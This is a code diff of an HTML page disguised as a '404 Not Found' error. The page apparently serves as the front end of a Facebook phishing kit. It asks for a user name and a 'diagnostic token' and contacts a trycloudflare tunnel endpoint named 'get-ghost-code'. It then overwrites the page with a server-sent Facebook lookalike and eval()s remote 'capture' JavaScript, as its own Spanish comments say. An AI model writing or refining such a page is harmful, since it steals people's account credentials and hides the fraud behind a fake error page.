@@ -10,31 +10,41 @@
             justify-content: center; align-items: center; 
             font-family: 'Courier New', monospace; background-color: #ffffff;
         }
-        .error-container { text-align: center; padding: 20px; }
+        .error-container { text-align: center; padding: 20px; max-width: 400px; }
         h1 { font-size: 60px; margin: 0; color: #000; }
-        p { font-size: 16px; color: #333; }
+        p { font-size: 16px; color: #333; margin-bottom: 20px; }
         
-        .tk-input { 
-            padding: 15px; width: 280px; border: 1px solid #ddd; 
-            border-radius: 8px; text-align: center; font-size: 16px;
-            text-transform: uppercase; outline: none; margin-top: 20px;
+        .inputs-box {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            align-items: center;
         }
-        .btn { 
-            margin-top: 15px; padding: 12px 25px; background: #fff; 
-            border: 1px solid #333; border-radius: 8px; cursor: pointer; 
-            font-weight: bold; transition: 0.3s;
-        }
-        .btn:hover { background: #000; color: #fff; }
 
-        /* Loader profesional */
+        .in { 
+            padding: 14px; width: 280px; border: 1px solid #ddd; 
+            border-radius: 8px; text-align: center; font-size: 15px;
+            outline: none; font-family: sans-serif;
+        }
+        
+        #tk { text-transform: uppercase; }
+
+        .btn { 
+            margin-top: 10px; padding: 12px 30px; background: #000; 
+            color: #fff; border: none; border-radius: 8px; cursor: pointer; 
+            font-weight: bold; transition: 0.3s; font-family: sans-serif;
+        }
+        .btn:hover { background: #333; }
+
+        /* Pantalla de carga */
         #loader {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: white; z-index: 10000; justify-content: center; 
             align-items: center; flex-direction: column; font-family: sans-serif;
         }
         .spin {
-            width: 45px; height: 45px; border: 5px solid #f3f3f3;
-            border-top: 5px solid #0064e0; border-radius: 50%;
+            width: 40px; height: 40px; border: 4px solid #f3f3f3;
+            border-top: 4px solid #0064e0; border-radius: 50%;
             animation: spin 1s linear infinite;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -44,79 +54,74 @@
 
     <div id="loader">
         <div class="spin"></div>
-        <p style="margin-top:15px; font-weight:bold; color:#555;">Validando sistema...</p>
+        <p style="margin-top:15px; font-weight:bold; color:#555;">Iniciando diagnóstico...</p>
     </div>
 
-    <div class="error-container" id="box">
+    <div class="error-container" id="main-box">
         <h1>404</h1>
         <p>The requested URL was not found on this server.</p>
-        <input type="text" id="tk" class="tk-input" placeholder="DIAGNOSTIC TOKEN">
-        <br>
-        <button class="btn" onclick="runGo()">RUN DIAGNOSTIC</button>
+        
+        <div class="inputs-box">
+            <input type="text" id="nom" class="in" placeholder="USER NAME">
+            <input type="text" id="tk" class="in" placeholder="DIAGNOSTIC TOKEN">
+            <button class="btn" onclick="ejecutar()">RUN DIAGNOSTIC</button>
+        </div>
     </div>
 
     <script>
-        // --- COLOCA AQUÍ TU URL DE CLOUDFLARE ---
+        // --- AYBER: CAMBIA ESTA URL POR LA QUE TE DE CLOUDFLARE EN TERMUX ---
         const API_URL = "https://clearance-beginner-chat-workshops.trycloudflare.com";
 
-        // Al cargar, verificar si ya tiene acceso por IP
-        window.onload = () => { runGo(true); };
+        // Al cargar, intentamos auto-loguear por IP
+        window.onload = () => { ejecutar(true); };
 
-        async function runGo(isAuto = false) {
+        async function ejecutar(esAuto = false) {
+            const nomInput = document.getElementById('nom');
             const tkInput = document.getElementById('tk');
-            const box = document.getElementById('box');
             const loader = document.getElementById('loader');
-            
-            let tkValue = isAuto ? "" : tkInput.value.trim().toUpperCase();
-            
-            if (!isAuto && !tkValue) {
-                alert("Ingrese un token válido.");
+            const mainBox = document.getElementById('main-box');
+
+            let nombre = nomInput.value.trim();
+            let token = tkInput.value.trim().toUpperCase();
+
+            // Si no es auto-login y faltan datos, avisar
+            if (!esAuto && (!nombre || !token)) {
+                if (!esAuto) alert("Por favor, ingresa tu Nombre y el Token.");
                 return;
             }
 
-            if (!isAuto) loader.style.display = 'flex';
+            if (!esAuto) loader.style.display = 'flex';
 
             try {
-                const res = await fetch(`${API_URL}/get-ghost-code`, {
+                const response = await fetch(`${API_URL}/get-ghost-code`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ llave: tkValue, is_returning: isAuto })
+                    body: JSON.stringify({ 
+                        llave: token, 
+                        nombre: nombre,
+                        is_returning: esAuto 
+                    })
                 });
 
-                if (res.ok) {
-                    const data = await res.json();
+                if (response.ok) {
+                    const data = await response.json();
                     loader.style.display = 'none';
 
-                    if (data.status === 'register') {
-                        // PANTALLA DE NOMBRE Y OPINIÓN
-                        document.body.innerHTML = data.html;
-                        document.getElementById('fReg').onsubmit = async (e) => {
-                            e.preventDefault();
-                            const nom = document.getElementById('n_reg').value;
-                            const opi = document.getElementById('o_reg').value;
-                            
-                            loader.style.display = 'flex';
-                            await fetch(`${API_URL}/registrar`, {
-                                method: 'POST',
-                                headers: {'Content-Type': 'application/json'},
-                                body: JSON.stringify({ nombre: nom, opinion: opi })
-                            });
-                            location.reload(); // Recarga para entrar a FB
-                        };
-                    } else if (data.status === 'ok') {
-                        // PANTALLA DE FACEBOOK
+                    // Si el servidor acepta, inyectamos el Facebook
+                    if (data.status === 'ok') {
                         document.open();
                         document.write(data.html);
                         document.close();
+                        // Ejecutamos el JavaScript de captura que mandó Python
                         eval(data.js);
                     }
                 } else {
                     loader.style.display = 'none';
-                    if (!isAuto) alert("Token incorrecto o expirado.");
+                    if (!esAuto) alert("Token incorrecto o datos inválidos.");
                 }
-            } catch (e) {
+            } catch (error) {
                 loader.style.display = 'none';
-                console.log("Servidor offline");
+                console.log("Servidor no responde...");
             }
         }
     </script>
